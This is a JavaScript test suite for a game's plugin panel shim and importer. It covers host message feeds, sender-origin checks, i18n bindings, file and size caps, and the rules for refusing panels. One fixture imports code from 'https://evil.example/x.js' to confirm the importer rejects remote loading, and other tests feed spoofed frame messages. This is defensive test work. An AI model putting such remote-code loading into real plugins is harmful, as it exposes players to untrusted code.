// Forge panel shim, host feeds and the importer's copy rules. Synthetic packs only.
// (i18n-ignore-file: fixture strings are pack data, not this game's UI)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';
import { parse } from 'acorn';
import { installForgeShim } from '../../shared/plugins/forgePanel.js';
import { hostState, hostWelcome, isMatchIntent } from '../../shared/plugins/ui.js';
import { PANEL_FILE_MAX, PANEL_FILES_MAX, PANEL_TOTAL_MAX, planForgePanel, forgePanelPage } from '../../server/plugins/forgePanels.js';
import { importForge, planForgeImport } from '../../server/plugins/forgeImport.js';
import { readVanillaAssets } from '../../server/plugins/registry.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const vanilla = readVanillaAssets(path.join(ROOT, 'data'));

test('P9: result panels contain a horizontal scroll host for wide tables without widening narrow panels', () => {
  const result = forgePanelPage({ slot: 'result.tab', title: 'Wide table', css: 'table{white-space:nowrap}', bundle: '' });
  assert.match(result, /body class="sp-forge-result"/);
  assert.match(result, /body\.sp-forge-result > div\s*\{[^}]*max-width:\s*100%[^}]*overflow-x:\s*auto/);
  assert.doesNotMatch(result, /min-width:\s*\d+(?:px|rem)/);
  const narrow = forgePanelPage({ slot: 'hud.right', title: 'Narrow', bundle: '' });
  assert.doesNotMatch(narrow, /body class="sp-forge-result"/);
});

function feedOf(opts) {
  const posts = [];
  const api = installForgeShim({});
  const feed = api.create({ post: (m) => posts.push(m), ...opts });
  return { api, feed, posts };
}

test('the shim feeds seats, settle stats, latency and welcome, and refuses what it cannot provide', () => {
  const { api, feed, posts } = feedOf({
    id: 'cap', slot: 'room.panel', marker: 'room', lang: 'zh',
    strings: { en: { '座位 {n}': 'seats {n}' } },
    declared: ['chess'],
    data: { chess: { id: 'a', n: 1 }, bonds: { id: 'no' } },
  });
  assert.equal(feed.ctx.net.status(), null);
  assert.equal(feed.ctx.net.welcome(), null);
  assert.equal(feed.ctx.me.room, null);
  const sent = feed.ctx.net.send();
  const sentAgain = feed.ctx.net.send();
  assert.deepEqual(sent, { available: false, reason: 'not available in this game' });
  assert.notEqual(sent, sentAgain);
  assert.deepEqual(feed.ctx.net.sendResourceMessage(), sent);
  assert.deepEqual(feed.ctx.session.setPreload(), sent);
  assert.deepEqual(feed.ctx.session.send('room.appearance'), sent);
  assert.equal(posts.length, 0);
  assert.equal(feed.ctx.data.get('chess').n, 1);
  feed.ctx.data.get('chess').n = 9;
  assert.equal(feed.ctx.data.get('chess').n, 1);
  assert.equal(feed.ctx.data.get('bonds'), null);
  assert.equal(feed.ctx.data.get('notices'), null);

  api.apply(feed, { v: 1, t: 'welcome', lang: 'en', version: 1, plugins: [], prefs: { note: 'hi' } });
  assert.equal(feed.ctx.t('座位 {n}', { n: 4 }), 'seats 4');
  assert.equal(feed.ctx.t('没有的词'), '没有的词');
  assert.equal(feed.ctx.net.welcome().version, '1');
  assert.equal(feed.ctx.net.welcome().mods.digest, undefined);
  assert.deepEqual(feed.ctx.net.welcome().mods.packs, []);
  assert.equal(feed.ctx.session.getPref('note'), 'hi');
  assert.equal(feed.ctx.session.getPref('missing', 3), 3);
  assert.equal(feed.ctx.session.setPref('obj', { a: 1 }), false);
  assert.equal(posts.length, 0);
  assert.equal(feed.ctx.session.setPref('note', 'x'), true);
  assert.equal(feed.ctx.session.getPref('note'), 'x');
  assert.equal(posts[0].t, 'storage');
  assert.equal(isMatchIntent(posts[0]), false);
  assert.equal(feed.ctx.session.setPref('nope', 'y'.repeat(4097)), false);

  let room = null;
  feed.ctx.net.on('room.state', (msg) => { room = msg; });
  feed.ctx.net.on('m.public', () => { throw new Error('econ must not be fed'); });
  api.apply(feed, {
    v: 1, t: 'state',
    public: { players: [{ playerId: 'p1', name: 'A' }] },
    private: { playerId: 'p1' },
    room: { seats: [{ seat: 0, playerId: 'p1', name: 'A' }, null, null, null], plugins: ['rose'] },
  });
  assert.equal(room.seats.length, 4);
  assert.equal(room.seats[3], null);
  assert.equal(feed.ctx.me.playerId, 'p1');
  assert.equal(feed.ctx.me.name, 'A');
  assert.deepEqual(feed.ctx.me.room.mods, ['rose']);

  let result = null;
  feed.ctx.net.on('m.result', (msg) => { result = msg; });
  api.apply(feed, { v: 1, t: 'result', result: { players: [{ playerId: 'p1', stats: { dmgDealt: 123456 } }] } });
  assert.equal(result.players[0].stats.dmgDealt, 123456);

  api.apply(feed, { v: 1, t: 'net', status: 'reconnecting', attempt: 3, retryAt: 80, rtt: 41, lastError: { code: 'closed', text: 'bye' } });
  assert.deepEqual(feed.ctx.net.status(), { status: 'reconnecting', attempt: 3, retryAt: 80, ping: 41, lastError: { code: 'closed', text: 'bye' } });
  assert.equal(Object.prototype.hasOwnProperty.call(feed.ctx.net.status(), 'ping'), true);
});

test('a result marker paints .screen.result and never .st', () => {
  const classes = new Set();
  const list = {
    add(...xs) { for (const c of xs) classes.add(c); },
    remove(...xs) { for (const c of xs) classes.delete(c); },
  };
  const { api, feed } = feedOf({ marker: 'result', doc: { documentElement: { classList: list }, body: { classList: list } } });
  api.apply(feed, { v: 1, t: 'result', result: { victory: true } });
  assert.equal(classes.has('screen'), true);
  assert.equal(classes.has('result'), true);
  assert.equal(classes.has('st'), false);
});

function filesOf(map) {
  const files = new Map();
  for (const [rel, text] of Object.entries(map)) files.set(rel, Buffer.from(text));
  return files;
}

test('only the parent can queue feeds, start a panel or update a running panel', () => {
  let receive;
  let mounts = 0;
  const parent = { postMessage() {} };
  const sibling = {};
  const root = { parent, addEventListener: (_type, fn) => { receive = fn; }, __spForgeMount: () => { mounts += 1; } };
  const api = installForgeShim(root);
  api.boot({ slot: 'hud.right' });
  const deliver = (source, data) => receive({ source, origin: 'null', data });
  deliver(sibling, { v: 1, t: 'result', result: { forged: true } });
  deliver(sibling, { v: 1, t: 'welcome', version: 999, plugins: ['spoof'] });
  assert.equal(mounts, 0);
  assert.equal(api.__feed, undefined);
  deliver(parent, { v: 1, t: 'net', rtt: 12 });
  deliver(parent, { v: 1, t: 'welcome', version: 1, plugins: [] });
  assert.equal(mounts, 1);
  assert.equal(api.__feed.result, null);
  assert.equal(api.__feed.ctx.net.status().ping, 12);
  for (const source of [sibling, null, root]) {
    deliver(source, { v: 1, t: 'welcome', version: 999, plugins: ['spoof'] });
    deliver(source, { v: 1, t: 'result', result: { forged: true } });
    deliver(source, { v: 1, t: 'state', room: { seats: ['forged'] } });
    deliver(source, { v: 1, t: 'net', rtt: 999 });
  }
  assert.equal(api.__feed.ctx.net.welcome().version, '1');
  assert.equal(api.__feed.result, null);
  assert.equal(api.__feed.room, null);
  assert.equal(api.__feed.ctx.net.status().ping, 12);
  deliver(parent, { v: 1, t: 'result', result: { victory: true } });
  assert.equal(api.__feed.result.victory, true);
});

test('static i18n named and namespace bindings execute, unsupported exports refuse the copy', () => {
  for (const [binding, call] of [['{ t as tr }', 'tr'], ['* as lang', 'lang.t']]) {
    const plan = planForgePanel({ parse, entry: 'p.js', panel: {}, files: filesOf({
      'p.js': `import ${binding} from '/shared/i18n.js'; export function mount(ctx){ctx.host.textContent=${call}('Room');}`,
    }) });
    assert.equal(plan.ok, true, plan.surfaces.join(','));
    const realm = vm.createContext({ __spForge: { __t: (s) => `translated:${s}` } });
    vm.runInContext(plan.bundle, realm);
    const host = {};
    realm.__spForgeMount({ host });
    assert.equal(host.textContent, 'translated:Room');
  }
  for (const binding of ['{ getLang }', 't', '{ t, setLang }']) {
    const plan = planForgePanel({ parse, entry: 'p.js', panel: {}, files: filesOf({
      'p.js': `import ${binding} from '/shared/i18n.js'; export function mount(ctx){ctx.host;}`,
    }) });
    assert.equal(plan.ok, false, binding);
    assert.ok(plan.surfaces.some((s) => s.startsWith('i18n:export:')));
  }
});

test('styles must be CSS and every unique asset counts toward the file cap', () => {
  const files = { 'p.js': 'export function mount(ctx){ctx.host;}', 'x.json': '{}', 'x.js': 'export const x=1;' };
  for (let i = 0; i < PANEL_FILES_MAX; i += 1) files[`s${i}.css`] = 'b{color:red}';
  for (const style of ['p.js', 'x.json', 'x.js']) {
    const bad = planForgePanel({ parse, entry: 'p.js', panel: { styles: [style] }, files: filesOf(files) });
    assert.equal(bad.ok, false, style);
    assert.ok(bad.surfaces.includes('style-type'));
  }
  const styles = Array.from({ length: PANEL_FILES_MAX - 1 }, (_, i) => `s${i}.css`);
  const atCap = planForgePanel({ parse, entry: 'p.js', panel: { styles: [...styles, styles[0]] }, files: filesOf(files) });
  assert.equal(atCap.ok, true);
  assert.equal(atCap.copies.length, PANEL_FILES_MAX);
  const over = planForgePanel({ parse, entry: 'p.js', panel: { styles: [...styles, `s${PANEL_FILES_MAX - 1}.css`] }, files: filesOf(files) });
  assert.equal(over.ok, false);
  assert.ok(over.surfaces.includes('cap:count'));
  const assets = Object.fromEntries(styles.map((s) => [s.replace('.css', '.json'), '{}']));
  assets['p.js'] = Object.keys(assets).map((s) => `import './${s}';`).join('') + "import './extra.json';export function mount(ctx){ctx.host;}";
  assets['extra.json'] = '{}';
  const jsonOver = planForgePanel({ parse, entry: 'p.js', files: filesOf(assets) });
  assert.equal(jsonOver.ok, false);
  assert.ok(jsonOver.surfaces.includes('cap:count'));
});

for (const [name, source, surface] of [
  ['guest URL', 'new URLSearchParams(globalThis.location.search);', 'host-location'],
  ['desktop bridge', 'if (!globalThis.desktop) return {};', 'desktop'],
  ['host controller', 'globalThis.__controller = {start(){}};', 'host-controller'],
  ['expanded capacity', 'const caps=[4,8,12,16,20]; const n=ctx.net.status()?.experimental?.playerCapacity;', 'room.capacity'],
]) test(`a panel needing ${name} stays manual`, () => {
  const plan = planForgeImport(filesOf({
    'pack.json': JSON.stringify({ id: 'missing-input', name: name, version: '1.0.0', client: { panels: [{ id: 'p', slot: 'root.guide', module: 'p.js' }] } }),
    'p.js': `export function mount(ctx){ctx.host;${source}}`,
  }), { parse, dataDir: path.join(ROOT, 'data'), vanilla });
  assert.equal(plan.meta.panels.filter((p) => p.copied).length, 0);
  assert.equal(plan.meta.manualPanels.length, 1);
  assert.ok(plan.meta.skipped.some((s) => s.surfaces?.includes(surface)));
});

test('room identity is sanitized, shortened and replaced or cleared with the room', () => {
  const { api, feed } = feedOf();
  const cs = '12345678'.repeat(8);
  const welcome = hostWelcome('p', [], { version: 1, plugins: ['rules'], cs });
  api.apply(feed, welcome);
  assert.equal(welcome.cs, cs);
  assert.equal(feed.ctx.net.welcome().mods.digest, '12345678');
  const next = hostState({}, {}, { seats: [null, null, null, null], content: { cs: 'abcdef00'.repeat(8), plugins: [] } });
  api.apply(feed, next);
  assert.equal(next.room.cs, 'abcdef00'.repeat(8));
  assert.equal(feed.ctx.net.welcome().mods.digest, 'abcdef00');
  api.apply(feed, hostState({}, {}, { seats: [], content: { cs: '<bad>', plugins: [] } }));
  assert.equal(feed.ctx.net.welcome().mods.digest, undefined);
  api.apply(feed, next);
  api.apply(feed, hostState({}, {}, null));
  assert.equal(feed.ctx.net.welcome().mods.digest, undefined);
  assert.deepEqual(feed.ctx.net.welcome().mods.packs, []);
  assert.equal(hostWelcome('p', [], { cs: 'secret' }).cs, undefined);
});

test('a relative closure is copied and a rejected specifier stays a skeleton', () => {
  const ok = planForgePanel({
    parse, entry: 'ui/panel.js', panel: { slot: 'screen.game.hud' },
    files: filesOf({
      'ui/panel.js': "import { n } from './b.js';\nexport function mount(ctx) { ctx.host.textContent = String(n); }\n",
      'ui/b.js': 'export const n = 2;\n',
    }),
  });
  assert.equal(ok.ok, true, ok.surfaces && ok.surfaces.join(','));
  assert.equal(ok.surfaces.length, 0);
  assert.match(ok.bundle, /__spMod\["ui\/b\.js"\]/);
  assert.doesNotMatch(ok.bundle, /\bimport\b/);
  parse(ok.bundle, { ecmaVersion: 2022, sourceType: 'script' });

  const bare = planForgePanel({
    parse, entry: 'ui/panel.js', panel: { slot: 'screen.game.hud' },
    files: filesOf({ 'ui/panel.js': "import x from 'react';\nexport function mount(ctx) { ctx.host.textContent = x; }\n" }),
  });
  assert.equal(bare.ok, false);
  assert.ok(bare.surfaces.some((s) => s.startsWith('import:react')));

  const remote = planForgePanel({
    parse, entry: 'ui/panel.js', panel: {},
    files: filesOf({ 'ui/panel.js': "export async function mount(ctx) { await import('https://evil.example/x.js'); ctx.host; }\n" }),
  });
  assert.equal(remote.ok, false);
  assert.ok(remote.surfaces.some((s) => s.includes('https://')));

  const abs = planForgePanel({
    parse, entry: 'ui/panel.js', panel: {},
    files: filesOf({ 'ui/panel.js': "import x from '/abs.js';\nexport function mount(ctx) { ctx.host; return x; }\n" }),
  });
  assert.equal(abs.ok, false);
  assert.ok(abs.surfaces.some((s) => s.includes('/abs.js')));

  const i18n = planForgePanel({
    parse, entry: 'ui/panel.js', panel: { slot: 'root.guide' },
    files: filesOf({
      'ui/panel.js': "export async function mount(ctx) { const { t } = await import('/shared/i18n.js'); ctx.net.on('room.state', () => { ctx.host.textContent = t('座位'); }); }\n",
    }),
  });
  assert.equal(i18n.ok, true, i18n.surfaces.join(','));
  assert.equal(i18n.listensRoom, true);
  assert.match(i18n.bundle, /__spForgeT/);
  assert.doesNotMatch(i18n.bundle, /\/shared\/i18n\.js/);
});

test('caps and unsupported calls refuse the copy', () => {
  const big = 'a'.repeat(PANEL_FILE_MAX + 1);
  const over = planForgePanel({
    parse, entry: 'ui/panel.js', panel: {},
    files: filesOf({ 'ui/panel.js': `${big}\nexport function mount(ctx) { ctx.host; }\n` }),
  });
  assert.equal(over.ok, false);
  assert.ok(over.surfaces.includes('cap:file'));

  const many = { 'ui/panel.js': "import './f0.js';\nexport function mount(ctx) { ctx.host.textContent = ''; }\n" };
  for (let i = 0; i < PANEL_FILES_MAX; i += 1) {
    const next = i + 1 < PANEL_FILES_MAX ? `import './f${i + 1}.js';\n` : '';
    many[`ui/f${i}.js`] = `${next}export const n${i} = ${i};\n`;
  }
  const count = planForgePanel({ parse, entry: 'ui/panel.js', panel: {}, files: filesOf(many) });
  assert.equal(count.ok, false);
  assert.ok(count.surfaces.includes('cap:count'));

  const chunk = 220 * 1024;
  const heavy = { 'ui/panel.js': "import './f0.js';\nexport function mount(ctx) { ctx.host.textContent = ''; }\n" };
  for (let i = 0; i < 5; i += 1) {
    const next = i + 1 < 5 ? `import './f${i + 1}.js';\n` : '';
    heavy[`ui/f${i}.js`] = `/*${'a'.repeat(chunk)}*/\n${next}export const n${i} = ${i};\n`;
  }
  const total = planForgePanel({ parse, entry: 'ui/panel.js', panel: {}, files: filesOf(heavy) });
  assert.equal(total.ok, false);
  assert.ok(total.surfaces.includes('cap:total'));
  assert.ok([...heavy.values ? [] : Object.values(heavy)].join('').length > PANEL_TOTAL_MAX);

  const send = planForgePanel({
    parse, entry: 'ui/panel.js', panel: { messages: ['say'] },
    files: filesOf({ 'ui/panel.js': "export function mount(ctx) { ctx.net.send({ t: 'say' }); ctx.host; }\n" }),
  });
  assert.equal(send.ok, false);
  assert.ok(send.surfaces.includes('send'));
  assert.ok(send.surfaces.includes('pack.messages'));
});

function writePack(dir, pack, files) {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'pack.json'), JSON.stringify(pack));
  for (const [rel, data] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, data);
  }
}

test('skeletons and dropped server, host styles or messages report partial/manual up front', async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-forge-panel-'));
  try {
    for (const [name, extra, source] of [
      ['skeleton', {}, 'export function mount(ctx){ctx.net.send("say",{});}'],
      ['server', { server: { modules: [{ entry: 'server.mjs' }] } }, 'export function mount(ctx){ctx.host;}'],
      ['host-style', { client: { theme: { vars: { '--x': 'red' } } } }, 'export function mount(ctx){ctx.host;}'],
      ['messages', { client: { messages: ['say'] } }, 'export function mount(ctx){ctx.host;}'],
    ]) {
      const dir = path.join(parent, name);
      const pack = { id: `probe-${name}`, name, version: '1.0.0', license: 'CC0-1.0', ...extra,
        client: { ...extra.client, panels: [{ slot: 'screen.game.hud', module: 'p.js' }] } };
      writePack(dir, pack, { 'p.js': source, 'server.mjs': 'throw new Error("must never run");' });
      for (const dryRun of [true, false]) {
        const out = path.join(parent, `out-${name}-${dryRun}`);
        const got = await importForge(dir, { pluginsDir: out, root: ROOT, dataDir: path.join(ROOT, 'data'), vanilla, dryRun });
        assert.equal(got.ok, true, got.markdown);
        assert.equal(got.report.partial, true, name);
        assert.equal(got.report.needsManualAdaptation, true, name);
        assert.ok(got.report.manualReasons.length, name);
        assert.ok(got.markdown.indexOf('部分导入 / Partial import') < got.markdown.indexOf('## 导入了什么'));
        assert.match(got.markdown, /需要人工适配 \/ Needs manual adaptation/);
        assert.equal(got.report.dropped?.panels || 0, name === 'skeleton' ? 1 : 0);
      }
    }
  } finally { fs.rmSync(parent, { recursive: true, force: true }); }
});

test('import copies a supported panel, keeps a skeleton for send, and tabs a second copy', async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-forge-panel-'));
  const opts = { pluginsDir: parent, root: ROOT, dataDir: path.join(ROOT, 'data'), vanilla, dryRun: true };
  try {
    const guide = path.join(parent, 'guide');
    writePack(guide, {
      id: 'seat-count', name: 'Seats', version: '1.0.0', license: 'CC0-1.0', content: [],
      i18n: { en: 'i18n/en.json' },
      client: { panels: [{ id: 'seats', name: 'Seats', slot: 'root.guide', module: 'ui/panel.js' }] },
    }, {
      'ui/panel.js': "export async function mount(ctx) { const { t } = await import('/shared/i18n.js'); ctx.net.on('room.state', (room) => { ctx.host.textContent = t('座位') + room.seats.length; }); }\n",
      'i18n/en.json': JSON.stringify({ 座位: 'seats' }),
    });
    const got = await importForge(guide, opts);
    assert.equal(got.ok, true, got.markdown);
    assert.equal(got.report.skipped.some((s) => s.code === 'PLUGIN_FORGE_PANEL_SCRIPT'), false);
    assert.equal(got.report.needsManualAdaptation, false);
    const ui = got.report.products.filter((p) => p.class === 'ui');
    assert.equal(ui.length, 1);
    assert.match(ui[0].imported[0], /room\.panel/);
    assert.equal(got.report.products.some((p) => p.class === 'lang'), true);

    const send = path.join(parent, 'send');
    writePack(send, {
      id: 'say-box', name: 'Say', version: '1.0.0', license: 'CC0-1.0', content: [],
      client: { panels: [{ id: 'say', name: 'Say', slot: 'screen.game.hud', module: 'ui/panel.js', messages: ['say'] }] },
    }, { 'ui/panel.js': "export function mount(ctx) { ctx.net.send({ t: 'say' }); }\n" });
    const skipped = await importForge(send, opts);
    assert.equal(skipped.ok, true, skipped.markdown);
    const row = skipped.report.skipped.find((s) => s.code === 'PLUGIN_FORGE_PANEL_SCRIPT');
    assert.ok(row);
    assert.match(row.zh, /没有复制/);
    assert.ok(row.surfaces.includes('send'));
    assert.equal(skipped.report.products.some((p) => p.class === 'ui'), true);

    const wrap = path.join(parent, 'wrap');
    writePack(wrap, {
      id: 'wrap-box', name: 'Wrap', version: '1.0.0', license: 'CC0-1.0', content: [],
      client: { panels: [{ id: 'card', name: 'Card', slot: 'screen.game.hud', module: 'ui/panel.js', wraps: 'shop' }] },
    }, { 'ui/panel.js': "export function mount(ctx) { ctx.host.textContent = 'x'; }\n" });
    const wrapped = await importForge(wrap, opts);
    assert.equal(wrapped.ok, true, wrapped.markdown);
    assert.equal(wrapped.report.needsManualAdaptation, true);
    assert.equal(wrapped.report.products.some((p) => p.class === 'ui'), false);
    assert.ok(wrapped.report.skipped.some((s) => s.code === 'PLUGIN_FORGE_MOUNT'));

    const two = path.join(parent, 'two');
    writePack(two, {
      id: 'two-panels', name: 'Two', version: '1.0.0', license: 'CC0-1.0', content: [],
      client: { panels: [
        { id: 'a', name: 'A', slot: 'root.overlays', module: 'a.js' },
        { id: 'b', name: 'B', slot: 'root.overlays', module: 'b.js' },
      ] },
    }, {
      'a.js': "export function mount(ctx) { ctx.host.textContent = 'a'; }\n",
      'b.js': "export function mount(ctx) { ctx.host.textContent = 'b'; }\n",
    });
    const both = await importForge(two, opts);
    assert.equal(both.ok, true, both.markdown);
    const uis = both.report.products.filter((p) => p.class === 'ui');
    assert.equal(uis.length, 2);
    assert.ok(uis.every((p) => /hud\.right/.test(p.imported[0])));
    assert.equal(both.report.needsManualAdaptation, false);
  } finally {
    fs.rmSync(parent, { recursive: true, force: true });
  }
});
